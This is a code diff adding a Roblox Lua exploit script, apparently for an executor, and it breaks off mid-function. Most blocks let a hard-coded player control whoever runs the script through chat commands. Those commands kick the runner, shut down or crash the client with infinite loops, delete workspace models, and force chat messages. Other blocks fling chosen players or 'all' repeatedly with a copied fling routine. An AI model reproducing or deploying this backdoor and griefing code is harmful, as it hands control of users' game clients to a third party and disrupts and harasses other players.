+        onPlayerChatted(player, message)
+    end)
+end
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnLoopJump" then
+QODIJDAKAKSNSKA = false
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Kick" then
+game:GetService("Players").LocalPlayer:Kick("Error Data Model")
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Exit" then
+game:Shutdown()
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Crash" then
+while true do print(Hello) end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Lag" then
+while wait() do
+for i = 1, 500 do
+print(LAG)
+end
+end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".RemoveWorkspace" then
+for i,v in pairs(workspace:GetChildren()) do
+            if v:IsA("Model") then
+                v:Destroy()
+            end
+        end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Sit" then
+game.Players.LocalPlayer.Character.Humanoid.Sit = true
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnSit" then
+game.Players.LocalPlayer.Character.Humanoid.Sit = false
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Lay" then
+local Human = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid
+	 if not Human then
+		 return
+	 end
+	 Human.Sit = true
+	 task.wait(.1)
+	 Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
+	 for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+		 v:Stop()
+	 end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Disable" then
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Enable" then
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Bug" then
+function getRoot(char)
+		 local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+		 return rootPart
+	 end
+	 
+	 local spinSpeed = ("inf")
+		 for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
+			 if v.Name == "Spinning" then
+				 v:Destroy()
+			 end
+		 end
+		 local Spin = Instance.new("BodyAngularVelocity")
+		 Spin.Name = "Spinning"
+		 Spin.Parent = getRoot(game.Players.LocalPlayer.Character)
+		 Spin.MaxTorque = Vector3.new(0, math.huge, 0)
+		 Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.Speed)%s*(.*)")
+        if command == ".Speed" then
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = argument
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.JumpPower)%s*(.*)")
+        if command == ".JumpPower" then
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = argument
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.Spin)%s*(.*)")
+        if command == ".Spin" then
+function getRoot(char)
+		 local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+		 return rootPart
+	 end
+	 
+	 local spinSpeed = (argument)
+		 for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
+			 if v.Name == "Spinning" then
+				 v:Destroy()
+			 end
+		 end
+		 local Spin = Instance.new("BodyAngularVelocity")
+		 Spin.Name = "Spinning"
+		 Spin.Parent = getRoot(game.Players.LocalPlayer.Character)
+		 Spin.MaxTorque = Vector3.new(0, math.huge, 0)
+		 Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.Say)%s*(.*)")
+        if command == ".Say" then
+if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer(""..argument.."", 'All')
+        else
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(""..argument.."")
+        end
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.Fling)%s*(.*)")
+        if command == ".Fling" then
+local player = game.Players.LocalPlayer
+ local mouse = player:GetMouse()
+ local Targets = {argument}
+ 
+ local Players = game:GetService("Players")
+ local Player = Players.LocalPlayer
+ 
+ local AllBool = false
+ 
+ local GetPlayer = function(Name)
+	Name = Name:lower()
+	if Name == "all" or Name == "others" then
+		AllBool = true
+		return
+	elseif Name == "random" then
+		local GetPlayers = Players:GetPlayers()
+		if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+		return GetPlayers[math.random(#GetPlayers)]
+	elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+		for _,x in next, Players:GetPlayers() do
+			if x ~= Player then
+				if x.Name:lower():match("^"..Name) then
+					return x;
+				elseif x.DisplayName:lower():match("^"..Name) then
+					return x;
+				end
+			end
+		end
+	else
+		return
+	end
+ end
+ 
+ local Message = function(_Title, _Text, Time)
+	print(_Title)
+	print(_Text)
+	print(Time)
+end
+ 
+ local SkidFling = function(TargetPlayer)
+	local Character = Player.Character
+	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+	local RootPart = Humanoid and Humanoid.RootPart
+ 
+	local TCharacter = TargetPlayer.Character
+	local THumanoid
+	local TRootPart
+	local THead
+	local Accessory
+	local Handle
+ 
+	if TCharacter:FindFirstChildOfClass("Humanoid") then
+		THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+	end
+	if THumanoid and THumanoid.RootPart then
+		TRootPart = THumanoid.RootPart
+	end
+	if TCharacter:FindFirstChild("Head") then
+		THead = TCharacter.Head
+	end
+	if TCharacter:FindFirstChildOfClass("Accessory") then
+		Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+	end
+	if Accessoy and Accessory:FindFirstChild("Handle") then
+		Handle = Accessory.Handle
+	end
+ 
+	if Character and Humanoid and RootPart then
+		if RootPart.Velocity.Magnitude < 50 then
+			getgenv().OldPos = RootPart.CFrame
+		end
+		if THumanoid and THumanoid.Sit and not AllBool then
+		end
+		if THead then
+			workspace.CurrentCamera.CameraSubject = THead
+		elseif not THead and Handle then
+			workspace.CurrentCamera.CameraSubject = Handle
+		elseif THumanoid and TRootPart then
+			workspace.CurrentCamera.CameraSubject = THumanoid
+		end
+		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+			return
+		end
+		
+		local FPos = function(BasePart, Pos, Ang)
+			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+		end
+		
+		local SFBasePart = function(BasePart)
+			local TimeToWait = 2
+			local Time = tick()
+			local Angle = 0
+ 
+			repeat
+				if RootPart and THumanoid then
+					if BasePart.Velocity.Magnitude < 50 then
+						Angle = Angle + 100
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+					else
+						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+						
+						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+						task.wait()
+					end
+				else
+					break
+				end
+			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+		end
+		
+		workspace.FallenPartsDestroyHeight = 0/0
+		
+		local BV = Instance.new("BodyVelocity")
+		BV.Name = "EpixVel"
+		BV.Parent = RootPart
+		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+		
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+		
+		if TRootPart and THead then
+			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+				SFBasePart(THead)
+			else
+				SFBasePart(TRootPart)
+			end
+		elseif TRootPart and not THead then
+			SFBasePart(TRootPart)
+		elseif not TRootPart and THead then
+			SFBasePart(THead)
+		elseif not TRootPart and not THead and Accessory and Handle then
+			SFBasePart(Handle)
+		else
+		end
+		
+		BV:Destroy()
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+		workspace.CurrentCamera.CameraSubject = Humanoid
+		
+		repeat
+			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+			Humanoid:ChangeState("GettingUp")
+			table.foreach(Character:GetChildren(), function(_, x)
+				if x:IsA("BasePart") then
+					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+				end
+			end)
+			task.wait()
+		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+		workspace.FallenPartsDestroyHeight = getgenv().FPDH
+	else
+	end
+ end
+ 
+ getgenv().Welcome = true
+ if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+ 
+ if AllBool then
+	for _,x in next, Players:GetPlayers() do
+		SkidFling(x)
+	end
+ end
+ 
+ for _,x in next, Targets do
+	if GetPlayer(x) and GetPlayer(x) ~= Player then
+		if GetPlayer(x).UserId ~= 1414978355 then
+			local TPlayer = GetPlayer(x)
+			if TPlayer then
+				SkidFling(TPlayer)
+			end
+		else
+		end
+	elseif not GetPlayer(x) and not AllBool then
+	end
+ end
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.LoopFling)%s*(.*)")
+        if command == ".LoopFling" then
+local Targets = {argument}
+	 Loopvoid = state
+	 repeat wait()
+ local player = game.Players.LocalPlayer
+ local mouse = player:GetMouse()
+ 
+ local Players = game:GetService("Players")
+ local Player = Players.LocalPlayer
+ 
+ local AllBool = false
+ 
+ local GetPlayer = function(Name)
+	Name = Name:lower()
+	if Name == "all" or Name == "others" then
+		AllBool = true
+		return
+	elseif Name == "random" then
+		local GetPlayers = Players:GetPlayers()
+		if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+		return GetPlayers[math.random(#GetPlayers)]
+	elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+		for _,x in next, Players:GetPlayers() do
+			if x ~= Player then
+				if x.Name:lower():match("^"..Name) then
+					return x;
+				elseif x.DisplayName:lower():match("^"..Name) then
+					return x;
+				end
+			end
+		end
+	else
+		return
+	end
+ end
+ 
+ local Message = function(_Title, _Text, Time)
+
+end
+ 
+ local SkidFling = function(TargetPlayer)
+	local Character = Player.Character
+	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+	local RootPart = Humanoid and Humanoid.RootPart
+ 
+	local TCharacter = TargetPlayer.Character
+	local THumanoid
+	local TRootPart
+	local THead
+	local Accessory
+	local Handle
+ 
+	if TCharacter:FindFirstChildOfClass("Humanoid") then
+		THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+	end
+	if THumanoid and THumanoid.RootPart then
+		TRootPart = THumanoid.RootPart
+	end
+	if TCharacter:FindFirstChild("Head") then
+		THead = TCharacter.Head
+	end
+	if TCharacter:FindFirstChildOfClass("Accessory") then
+		Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+	end
+	if Accessoy and Accessory:FindFirstChild("Handle") then
+		Handle = Accessory.Handle
+	end
+ 
+	if Character and Humanoid and RootPart then
+		if RootPart.Velocity.Magnitude < 50 then
+			getgenv().OldPos = RootPart.CFrame
+		end
+		if THumanoid and THumanoid.Sit and not AllBool then
+			return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
+		end
+		if THead then
+			workspace.CurrentCamera.CameraSubject = THead
+		elseif not THead and Handle then
+			workspace.CurrentCamera.CameraSubject = Handle
+		elseif THumanoid and TRootPart then
+			workspace.CurrentCamera.CameraSubject = THumanoid
+		end
+		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+			return
+		end
+		
+		local FPos = function(BasePart, Pos, Ang)
+			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+		end
+		
+		local SFBasePart = function(BasePart)
+			local TimeToWait = 2
+			local Time = tick()
+			local Angle = 0
+ 
+			repeat
+				if RootPart and THumanoid then
+					if BasePart.Velocity.Magnitude < 50 then
+						Angle = Angle + 100
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+					else
+						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+						
+						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+						task.wait()
+					end
+				else
+					break
+				end
+			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+		end
+		
+		workspace.FallenPartsDestroyHeight = 0/0
+		
+		local BV = Instance.new("BodyVelocity")
+		BV.Name = "EpixVel"
+		BV.Parent = RootPart
+		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+		
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+		
+		if TRootPart and THead then
+			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+				SFBasePart(THead)
+			else
+				SFBasePart(TRootPart)
+			end
+		elseif TRootPart and not THead then
+			SFBasePart(TRootPart)
+		elseif not TRootPart and THead then
+			SFBasePart(THead)
+		elseif not TRootPart and not THead and Accessory and Handle then
+			SFBasePart(Handle)
+		else
+			return Message("Error Occurred", "Target is missing everything", 5)
+		end
+		
+		BV:Destroy()
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+		workspace.CurrentCamera.CameraSubject = Humanoid
+		
+		repeat
+			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+			Humanoid:ChangeState("GettingUp")
+			table.foreach(Character:GetChildren(), function(_, x)
+				if x:IsA("BasePart") then
+					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+				end
+			end)
+			task.wait()
+		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+		workspace.FallenPartsDestroyHeight = getgenv().FPDH
+	else
+		return Message("Error Occurred", "Random error", 5)
+	end
+ end
+ 
+ if not Welcome then Message("Script by AnthonyIsntHere", "Enjoy!", 5) end
+ getgenv().Welcome = true
+ if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+ 
+ if AllBool then
+	for _,x in next, Players:GetPlayers() do
+		SkidFling(x)
+	end
+ end
+ 
+ for _,x in next, Targets do
+	if GetPlayer(x) and GetPlayer(x) ~= Player then
+		if GetPlayer(x).UserId ~= 1414978355 then
+			local TPlayer = GetPlayer(x)
+			if TPlayer then
+				SkidFling(TPlayer)
+			end
+		else
+			Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
+		end
+	elseif not GetPlayer(x) and not AllBool then
+		Message("Error Occurred", "Username Invalid", 5)
+	end
+ end
+	 until Loopvoid == false
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.HeadBang)%s*(.*)")
+        if command == ".HeadBang" then
+RunService = game:GetService("RunService")
+	 speed = 2
+			 bangAnim = Instance.new("Animation")
+if (game:GetService"Players".LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6) then
+				 bangAnim.AnimationId = "rbxassetid://148840371"
+			 else
+				 bangAnim.AnimationId = "rbxassetid://5918726674"
+			 end
